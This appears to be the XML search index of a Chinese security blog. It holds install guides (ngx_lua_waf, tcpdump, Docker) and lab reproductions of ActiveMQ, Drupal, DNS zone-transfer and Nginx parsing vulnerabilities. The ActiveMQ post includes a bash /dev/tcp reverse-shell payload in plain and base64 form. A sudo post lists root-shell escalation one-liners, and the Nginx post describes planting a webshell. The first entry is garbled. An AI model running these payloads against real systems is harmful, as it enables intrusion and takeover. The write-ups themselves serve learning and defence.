<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F15%2F-untitled%2F</url>
    <content type="text"><![CDATA[���ѷ��������뿪ʱ����alert('tomcat')�����͵����鸹����ʱ�����䰮����ʥ���ڷٿ�ʳ��]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux安装ngx_lua_waf实现waf功能]]></title>
    <url>%2F2019%2F07%2F22%2FLinux%E5%AE%89%E8%A3%85ngx_lua_waf%E5%AE%9E%E7%8E%B0waf%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[Linux安装ngx_lua_waf实现waf功能一、ngx_lua_waf用途 1、防止SQL注入，本地包含，本地溢出，fuzzing测试，XSS，SSRF等web攻击;2、防止SVN/备份之类文件泄漏;3、防止apachebench之类的压力测试工具的攻击;4、屏蔽常见的扫描黑客工具，扫描器;5、屏蔽常见的网络请求;6、屏蔽照片附件类目录php执行权限;7、防止webshell上传。 二、安装1、首先安装所需要的依赖环境yum -y install gcc gcc-c++ wget git geoip-devel gd-devel pcre-deve libcurl-devel libxml2 libxml2-devel libgd-devel openssl-devel lua-devel 2、LuaJIT 下载并安装LuaJIT2.0.5，首先来到/usr/local/src（压缩包存放目录）目录下。 cd /usr/local/src wget http://luajit.org/download/LuaJIT-2.0.5.tar.gztar -zxvf LuaJIT-2.0.5.tar.gzcd LuaJIT-2.0.5make install PREFIX=/usr/local/src/luajit然后创建一条软连接：ln -s /usr/local/src/luajit/lib/libluajit-5.1.so.2 /lib64/libluajit-5.1.so.2 3、ngx_devel_kit下载并安装ngx_devel_kitcd /usr/local/srcwget https://github.com/simpl/ngx_devel_kit/archive/v0.3.0.tar.gztar -zxvf v0.3.0.tar.gz 4、lua-nginx-model下载并安装lua-nginx-model（nginx的lua模块）wget https://github.com/openresty/lua-nginx-module/archive/v0.10.14rc3.tar.gztar -zxvf v0.10.14rc3.tar.gz 5、安装nginx下载并安装nginx，这里我选择的是1.15.2版本的。wget http://nginx.org/download/nginx-1.15.2.tar.gz然后开始编译安装。./configure \ --user=www \ --group=www \ --prefix=/data/server/nginx \ --error-log-path=/data/server/nginx/error.log \ --http-log-path=/data/server/nginx/access.log \ --with-http_ssl_module \ --with-http_v2_module \ --with-http_realip_module \ --with-http_addition_module \ --with-http_image_filter_module \ --with-http_geoip_module \ --with-http_sub_module \ --with-http_dav_module \ --with-http_flv_module \ --with-http_mp4_module \ --with-http_gunzip_module \ --with-http_gzip_static_module \ --with-http_random_index_module \ --with-http_secure_link_module \ --with-http_degradation_module \ --with-http_slice_module \ --with-http_stub_status_module \ --with-pcre \ --with-pcre-jit \ --with-stream \ --with-stream_ssl_module \ --with-debug \ --add-module=/usr/local/src/ngx_devel_kit-0.3.0 \ --add-module=/usr/local/src/lua-nginx-module-0.10.14rc3 \ --with-ld-opt=&quot;-Wl,-rpath,$LUAJIT_LIB&quot; ;检查没问题的话开始安装：make &amp;&amp; make install 6、下载并安装waf模块wget https://github.com/hack-umbrella/ngx_lua_waf/archive/master.zip解压并改名为waf，移动到nginx的配置目录下unzip master.zipmv /usr/local/src/ngx_lua_waf-0.7.2/ wafcp -rf /usr/local/src/waf/ /data/server/nginx/conf/修改waf模块的规则配置路径vim /data/server/nginx/conf/waf/config.lua修改配置文件为如下： RulePath = “/data/server/nginx/conf/waf/wafconf/“ –规则存放目录 attacklog = “off” –是否开启攻击信息记录，需要配置logdir logdir = “/data/server/nginx/logs/hack/“ –log存储目录，该目录需要用户自己新建，切需要nginx用户的可写权限 UrlDeny=”on” –是否拦截url访问 Redirect=”on” –是否拦截后重定向 CookieMatch = “on” –是否拦截cookie攻击 postMatch = “on” –是否拦截post攻击 whiteModule = “on” –是否开启URL白名单 black_fileExt={“php”,”jsp”} –填写不允许上传文件后缀类型 ipWhitelist={“127.0.0.1”} –ip白名单，多个ip用逗号分隔 ipBlocklist={“1.0.0.1”} –ip黑名单，多个ip用逗号分隔 CCDeny=”on” –是否开启拦截cc攻击(需要nginx.conf的http段增加lua_shared_dict limit 10m;) CCrate = “30/60” –设置cc攻击频率，单位为秒. –默认1分钟同一个IP只能请求同一个地址30次 html=[[Please go away~~]] –警告内容,可在中括号内自定义 备注:不要乱动双引号，区分大小写._ 修改nginx的配置文件使其加载waf功能模块。vim /data/server/nginx/conf/nginx.confhttp里面添加如下（注意文件内的格式） lua_package_path &quot;/data/server/nginx/conf/waf/?.lua&quot;; lua_shared_dict limit 10m; init_by_lua_file /data/server/nginx/conf/waf/init.lua; access_by_lua_file /data/server/nginx/conf/waf/waf.lua;创建nginx的启动脚本vim /lib/systemd/system/nginx.service内容如下：== [Unit]Description=The NGINX HTTP and reverse proxy serverAfter=syslog.target network.target remote-fs.target nss-lookup.target [Service]Type=forkingPIDFile=/data/server/nginx/logs/nginx.pidExecStartPre=/data/server/nginx/sbin/nginx -tExecStart=/data/server/nginx/sbin/nginxExecReload=/data/server/nginx/sbin/nginx -s reloadExecStop=/usr/bin/kill -s QUIT $MAINPIDPrivateTmp=true [Install]WantedBy=multi-user.target== 启动nginx并设置为开机自启systemctl start nginx.servicesystemctl enable nginx.service创建nginx的软连接:ln -s /data/server/nginx/sbin/* /usr/local/sbin/ 三、测试浏览器访问：http://安装waf的IP/test.txt?id=../../etc/passwd如上图所示，WAF成功起了作用。还可以根据自己的需求给WAF添加过滤规则，使其更安全可靠，到这一个简单的WAF就搭建完成了。]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ActiveMQ反序列化漏洞（CVE-2015-5254）复现]]></title>
    <url>%2F2019%2F07%2F19%2FActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[ActiveMQ反序列化漏洞（CVE-2015-5254）复现 漏洞背景： Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。 存在该漏洞的ip为（靶机）：192.168.199.120:8161发起攻击的ip（主机）：192.168.199.197 漏洞利用过程如下：①构造可执行命令的序列化对象②作为一个消息，发送目标61616端口③访问web管理页面，读取信息，触发漏洞。这里我们是用ysoserial来构造序列化对象，ysoserial是一个Java反序列化工具框架，它包含常见的Java反序列化类型，可以生成一些payload。这里我们使用jmet，jemt自带ysoserial，我们先下载jmet的jar文件，并在同一目录下创建external目录（要不然可能会报目录不存在的错误）#cd /opt#wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar#mkdir external然后执行如下命令：#java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME 192.168.199.120 61616 在靶机的tmp目录下创建一个sucess文件。这时我们执行完后会给目标ActiveMQ添加一个名为event的队列，然后我们访问：http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event然后点击上面截图中ID对应的板块 点击这条消息即可触发命令执行。这时靶机的tmp目录下已经创建了sucess。 漏洞利用：利用方法也很简单，只需要把上面创建文件的命令换成反弹shell语句就可以利用了。payload：bash -i&gt;&amp; /dev/tcp/192.168.199.197/9999 0&gt;&amp;1不过这里我们需要一点小技巧来绕过Java机制。（把上面的payload进行base64编码）bash -c {echo,base64编码后的payload}|{base64,-d}|{bash,-i}然后我们是使用同样的命令将payload发送到61616端口。#java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c {echo,YmFzaCAtaT4mIC9kZXYvdGNwLzE5Mi4xNjguMTk5LjE5Ny85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}&quot; -Yp ROME 192.168.199.120 61616 然后执行命令：#nc -lvvp 9999 进行监听9999端口然后到http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event网址下找到该ID对应的板块，并点击。然后回到终端查看： OK!成功拿到root权限的shell。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下的sniffer工具--Tcpdump]]></title>
    <url>%2F2019%2F07%2F16%2FLinux%E4%B8%8B%E7%9A%84sniffer%E5%B7%A5%E5%85%B7--Tcpdump%2F</url>
    <content type="text"><![CDATA[Linux下的sniffer工具–Tcpdump什么是tcpdump？ Tcpdump就是Linux平台下一个以命令行方式运行的网络流量监测工具。他能截获网卡上收到的数据包，并能够协助网络管理员对其中的内容进行相应的分析。 嗅探器能够截获指定接口或任何接口的数据包，这取决于如何对嗅探器进行配置。缺省情况下嗅探器一般会显示任何从网络上截获的数据包，但通常会因为数据量过大而使网络管理员理不清头绪。因此，嗅探器一般都提供有相应的机制来对截获的数据包进行过滤，从而只显示符合特定需要的数据包。 Tcpdump提供了一整套完善的规则来对截获的数据包进 行过滤，由于大多数图像化的嗅探器都使用类似的过滤机制，因此对Linux网络管理员来说，了解如何使用Tcpdump来捕获感兴趣的数据包是一项必须掌控的基本功。 1、下载地址在一些Linux发行版中，Tcpdump通常作为标准的软件包被默认安装，执行“tcpdump”命令能够确定是否已安装了Tcpdump。假如系统中还没有安装Tcpdump。 可以到tcpdump官网“http://www.tcpdump.org”，去下载最新的tcpdump源码包。这里需要注意的一点：因tcpdump的运行需要pcap的支持，所以最好先行安装pcap软件包，另外还要注意软件的版本问题，建议按照网站上匹配的软件包tcpdump和pcap一同下载。如上图所示，我这里是4.9.2的tcpdump包和1.9.0的libpcap包。尽量不要yum安装pcap。（如果不是官方匹配的版本，可能会出现未预料的错误） 2、安装过程首先安装pcap依赖包，这个库是编译tcpdump时所必需的。#wget https://www.tcpdump.org/release/libpcap-1.9.0.tar.gz#tar -zxvf libpcap-1.9.0.tar.gz#cd libpcap-1.9.0#./configure#make#make install 然后安装tcpdump。#wget https://www.tcpdump.org/release/tcpdump-4.9.2.tar.gz#tar -zxvf tcpdump-4.9.2.tar.gz#cd tcpdump-4.9.2#./configure#make#make installOK，tcpdump到这就安装好了。 3、tcpdump命令行选项。Tcpdump是个命令行方式的网络嗅探器。他通过使用命令选项来过滤网卡截获的数据包，假如不进行过滤，过多数量的包会使网络管理员很难理清头绪。Tcpdump的命令格式如下： tcpdump [ -adeflnNOpqRStuvxX ] [ -c 数量 ] [ -C 文档尺寸 ] [ -F 文档名 ] [ -i 网络接口 ] [ -m 文档名 ] [ -r 文档名 ] [ -s 长度 ] [ -T 类型 ] [ -w 文档名 ] [ -E algo:secret ] [ 表达式 ] Tcpdump常用命令行选项：-a 将网络地址和广播地址转变成容易识别的名字-d 将已截获的数据包的代码以人容易理解的格式输出；-dd 将已截获的数据包的代码以C程式的格式输出；-ddd 将已截获的数据包的代码以十进制格式输出；-e 输出数据链路层的头部信息；-f 将internet地址以数字形式输出；-l 将标准输出变为行缓冲方式；-n 不将网络地址转换成易识别的主机名，只以数字形式列出主机地址(如IP地址)，这样能够避免DNS查询；-t 不输出时间戳；-v 输出较周详的信息，例如IP包中的TTL和服务类型信息；-vv 输出详尽的报文信息；-c 在捕获指定个数的数据包后退出；-F 从指定的文档中读取过滤规则，忽略命令行中指定的其他过滤规则；-i 指定监听的网络接口；-r 从指定的文档中读取数据包(该文档一般通过-w选项产生)；-w 将截获的数据包直接写入指定的文档中，不对其进行分析和输出；-T 将截获的数据包直接解释为指定类型的报文，现在支持的类型有cnfp、rpc、rtp、snmp、vat和wb。]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sudo提权及防范]]></title>
    <url>%2F2019%2F07%2F12%2Fsudo%E6%8F%90%E6%9D%83%E5%8F%8A%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[sudo提权及防范1、什么是sudo在日常的运维安全工作中，经常会遇到开发 OR 测试 同学要求: 我需要在某某服务器上运行一个东东，必须以root权限运行，请帮忙处理下。怎么办？ 直接给root账户，让其搞去？ 不存在的，但凡是个有章程的公司都不会共享root账户，比较普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权，可以临时让其以root 权限运行某个程序。 但是运维的小伙子们，sudo 授权可要小心，不能求而不拒，什么程序都放行，不然可能会被别有用心的人恶意提权成root账户权限。 下文会详细介绍如何利用特定的sudo 授权程序进行提权。 2、常见的可以利用sudo提升到root权限的命令2.1 ziptomcat用户是个普通用户，申请sudo授权zip命令。首先在tmp目录下创建一个test文件。然后执行：sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot; 成功提权到完整的root权限。-T表示测试test.zip的完整性。–unzip-command 与-T 一起使用，可以指定自定义命令 用于解压test.zip(测试用)利用点就在 可以自定义用于解压test.zip 的的命令，当然自定义解压命令是以root权限执行的，这里指定为sh -c /bin/bash, 就可以以root权限获取一个shell。 2.2 tartomcat是个普通用户，执行命令：sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash 成功提权成完整root权限。简单解释一下，提权是如何实现的： –checkpoint-action 选项是提权点，可以自定义需要执行的动作，当然是以root权限执行。这里指定为exec=/bin/bash，以root权限执行/bin/bash，获取一个root权限的shell 2.3 nmaptomcat为普通用户执行命令：echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse sudo nmap --script=/tmp/shell.nse 以root权限执行nmap，然后nmap执行脚本，脚本执行/bin/sh，获取root权限shell。如果是老版本的nmap，还可以换一种姿势利用nmap实现root提权。sudo nmap --interactive nmap&gt; !sh sh-4.1# 2.4 stracetomcat为普通用户，执行命令：sudo strace -o/dev/null /bin/bash strace以root权限运行跟踪调试/bin/bash，从而获取root权限的shell。 2.5 moretomcat为普通用户，执行命令：sudo more /etc/rsyslog.conf然后键入!/bin/bash 即可获得root权限的shell。 同理的命令还有less和man （sudo man ssh） 2.6 gittomcat为普通用户，执行命令：sudo git help status 然后键入!/bin/bash，即可以root权限运行/bin/bash，获取root权限的shell，原理同more。 2.7 ftptomcat的为普通用户，执行命令：sudo ftp然后键入!/bin/absh,便可以root权限运行，获取root权限的shell。 2.8 vimtomcat为普通用户，执行命令：sudo vim -c &#39;!sh&#39;可以直接以root权限运行 指定命令，这里可以直接获取root权限的shell. 2.9 findtomcat为普通用户，执行命令：sudo find /bin/ -name ls -exec /bin/bash \; 对于find检索到的每一个结果，都执行/bin/bash，是以root权限执行的哦，很方便的获取root权限的shell。 2.10 passwdtomcat为普通用户，执行命令：sudo passwd sudo passwd 可以更改root密码。然后su root，输入修改后的密码，就可以切换到root shell。 3、如何防范？这才是我关注的重点必须得说，这个不是很好防范，只能尽量减少风险sudo的配置文件只能限制那些用户可以使用sudo，可以使用哪些命令，但不能限制用户使用这些命令进行提权获取root shell，我们设置sudo的本意就是让用户能临时获取root 权限执行某些命令而不是永久获取root shell 并可以root权限执行任何命令，有什么好的办法的？ 我总结了以下几个方法以期能减少sudo 使用带来的风险1） 不要安装某些工具命令比如strace、ftp、nmap、tcpdump、except、nano，这些命令都是可以实现sudo + 命令 提权成root shell的，况且这些命令都不是必须的2） sudo 不能滥授权授权之前，必须仔细审核，能不授权的授权，多考虑替代方案，必要的才授权3）其次使用堡垒机拦截非法命令有人说将用户加入root组，不存在的，加入root组并不能保证用户以root身份执行某些命令。 最好的办法就是前置堡垒机，在堡垒机上进行非法命令拦截，经过我的一番探索，在我司的堡垒机（基于jumpserver 二次开发，研究过jumpserver代码的对下文代码应该会比较熟悉）上实现了拦截非法sudo 提权命令的功能：代码简写如下： data 即为解析后的完整命令，通过正则匹配来检测是否有非法命令（黑名单思路，故有可能被绕过，白名单不知道咋搞） 4、总结如果获取了对于某个命令的sudo 授权，则有可能利用sudo获取root shell，所以在审核申请人sudo 请求的时候，一定要留心。当然还有很多其他命令可以实现0x01 提到的哪些命令所实现的root提权，比如 nano 、wget （通过写密码文件）、tcpdump等]]></content>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7源码安装docker]]></title>
    <url>%2F2019%2F07%2F10%2FCentOS%207%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85docker%2F</url>
    <content type="text"><![CDATA[CentOS 7 源码安装 dockerDocker介绍：Docker 是一个开放源代码软件项目，让应用程序布署在软件货柜下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker 利用 Linux 核心中的资源分离机制，例如 cgroups，以及 Linux 核心名字空间，来创建独立的容器。 –维基百科 安装Docker移除旧版本的 Docker yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine 创建 docker 组 groupadd docker 向 docker 组中添加您的用户 usermod -aG docker $USER 安装 Docker 依赖yum install -y yum-utils device-mapper-persistent-data lvm2 添加源yum-config-manager –add-repo https://download.docker.com/linux/centos/docker-ce.repo 更新 yum 缓存yum makecache fast 安装 Docker-CE yum install -y docker-ce 开启 Docker systemctl start docker 安装 Docker Compose curl -L “https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose 开机自启动systemctl enable docker 镜像加速器 vim /etc/docker/daemon.json { “registry-mirrors”: [ “https://registry.docker-cn.com“ ] } 重新启动服务 systemctl daemon-reload systemctl restart docker]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）复现]]></title>
    <url>%2F2019%2F07%2F09%2FDrupal%20Drupalgeddon%202%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7600%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）复现 漏洞原理：Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。详细介绍可参考：https://research.checkpoint.com/uncovering-drupalgeddon-2/。漏洞分析详情可参考： http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/ 存在该漏洞的ip（靶机）：192.168.199.105:8080发起攻击的ip（主机）：192.168.199.195环境搭建好以后，访问http://192.168.199.105:8080/， 可以看到drupal的安装页面，默认配置安装就可以了。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现：打开burp拦截，拦截到安装好的drupal的流量包，发送到重发器。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS域传送漏洞 复现]]></title>
    <url>%2F2019%2F07%2F07%2FDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%20%20%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[DNS介绍：DNS(Domain Name System，域名管理系统)是万维网WWW的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。 正因为DNS的存在，我们才不需要记住大量无规则的IP地址， 而只需要知道对方计算机的名称，就可以访问对应服务。比如，笔者的博客是www.lijiejie.com，当用户在浏览器地址栏输入上述域名，浏览器就将向DNS服务器发送查询，得到目标主机的IP地址，再与对应的主机建立一个HTTP连接，请求网页。相对于记住106.187.34.156这个IP地址，域名www.lijiejie.com自然更有意义、更加清晰明了。 DNS服务器使用的TCP/UDP端口号是53。 最常用的DNS记录有以下几类： A记录 IP地址记录,记录一个域名对应的IP地址 AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址 CNAME记录 别名记录，记录一个主机的别名 MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址，比如my[at]lijiejie.com 后面的部分lijiejie.com，邮件服务器对应的IP地址 NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR记录 反向记录，也即从IP地址到域名的一条记录 TXT记录 记录域名的相关文本信息 更多详解请参考： http://www.lijiejie.com/dns-zone-transfer-1/ 存在该漏洞的ip（靶机）：192.168.199.151:53 发起攻击的ip（主机）：192.168.199.195 漏洞复现：首先浏览器访问： http://192.168.199.151:53/ 可以看出无法访问该网站。 在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @192.168.199.151 www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org： 可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。 我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org“ -Pn -p 53 192.168.199.151。完毕！可以看出该IP确实存在着DNS域传送漏洞。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx解析漏洞 复现]]></title>
    <url>%2F2019%2F07%2F04%2FNginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Nginx 解析漏洞复现 版本信息：nginx 1.x最新版PHP 7.x最新版 由此得知，该漏洞与nginx和PHP版本无关，属于用户配置不当造成的解析漏洞。 存在该漏洞的ip（靶机）：192.168.199.173发起攻击的ip（主机）：192.168.199.195环境搭好以后，首先浏览器访问一下 http://192.168.199.173/uploadfiles/nginx.png和 http://192.168.199.173/uploadfiles/nginx.png/.php，正常访问情况如下：可以看出，在结尾添加/.php之后，就被解析成了PHP文件。然后浏览器访问 http://192.168.199.173/index.php，来测试一下上传功能。上传代码是不存在漏洞的，但是可以通过解析漏洞getshell。然后打开burp拦截，随便选一张图片进行上传。然后把拦截到的流量发送到重发器。然后在POST提交的数据最后添加一句话木马。可以看到已经上传成功了。然后试着在浏览器访问一下。可以看到已经上传成功了。然后试着在最后添加/.php全是乱码，说明一句话可能已经被解析了。试着用蚁剑连接一下。OK，可以看到已经成功拿到shell了。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Drupal远程代码执行漏洞（CVE-2018-7602）复现]]></title>
    <url>%2F2019%2F07%2F01%2FDrupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Drupal远程代码执行漏洞（CVE-2018-7602）复现 漏洞原理：影响软件：drupal。方式：对URL中的#进行编码两次，绕过sanitize()函数过滤。效果：任意命令执行。漏洞详细分析可参考：http://blog.nsfocus.net/cve-2018-7602-drupal/。 存在该漏洞的ip（靶机）：192.168.199.151:8081发起攻击的ip（主机）：192.168.199.195环境搭好之后，首先浏览器访问： http://192.168.199.151:8081。将会看到drupal的安装界面，直接默认配置安装就可以了，因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现：首先需要整到一个POC，参考网址：https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py。执行如下命令，即可复现该漏洞。 #python3 drupa7-CVE-2018-7602.py -c “id” admin 123456 http://192.168.199.151:8081/。 #admin为用户名；123456为密码；后面ip改为靶机ip；本次实例命令为’id’。如上图所示，看到红框中的内容，得知ID命令已成功执行。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
</search>
